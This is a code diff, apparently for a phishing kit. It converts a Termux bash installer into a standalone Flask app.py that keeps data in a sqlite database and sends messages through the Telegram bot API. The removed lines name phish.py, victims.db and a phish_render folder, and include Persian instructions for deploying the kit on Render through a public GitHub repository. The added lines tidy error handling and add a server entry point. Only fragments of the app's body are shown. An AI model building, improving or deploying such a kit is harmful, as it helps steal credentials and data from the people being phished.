@@ -1,23 +1,3 @@
-cat > ~/setup_render.sh <<'OUTER'
-#!/data/data/com.termux/files/usr/bin/bash
-cd ~
-echo "[*] cleaning old files..."
-pkill -f phish.py 2>/dev/null || true
-pkill -f ssh 2>/dev/null || true
-pkill -f gunicorn 2>/dev/null || true
-rm -rf ~/phish_render ~/phish.py ~/victims.db ~/run_phish.sh
-
-echo "[*] creating render folder..."
-mkdir -p ~/phish_render
-cd ~/phish_render
-
-cat > requirements.txt << 'EOF'
-flask
-requests
-gunicorn
-EOF
-
-cat > app.py << 'PYEOF'
 import os, sys, time, html, secrets, re, base64, sqlite3
 from flask import Flask, request, redirect, render_template_string
 import requests
@@ -39,7 +19,9 @@ init_db()
 
 def tg(method, **kw):
     try: return requests.post(f"{API}/{method}", data=kw, timeout=15).json()
-    except: return {}
+    except Exception as e: 
+        print(f"TG error: {e}")
+        return {}
 
 def send(chat, text):
     return tg("sendMessage", chat_id=chat, text=text, parse_mode="HTML", disable_web_page_preview=True)
@@ -155,17 +137,7 @@ def set_webhook():
 @app.route("/")
 def index():
     return "System OK", 200
-PYEOF
 
-echo "[*] done."
-echo "----------------------------------------"
-echo "فایل‌ها ساخته شدن تو پوشه: ~/phish_render"
-echo ""
-echo "قدم بعدی: باید این دو تا فایل رو ببری روی Render."
-echo "راحت‌ترین راه: برو گیت‌هاب، یه ریپازیتوری Public بساز،"
-echo "این دو تا فایل رو آپلود کن، بعد تو Render لینک ریپو رو بده."
-echo "----------------------------------------"
-ls -la ~/phish_render
-OUTER
-chmod +x ~/setup_render.sh
-bash ~/setup_render.sh
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
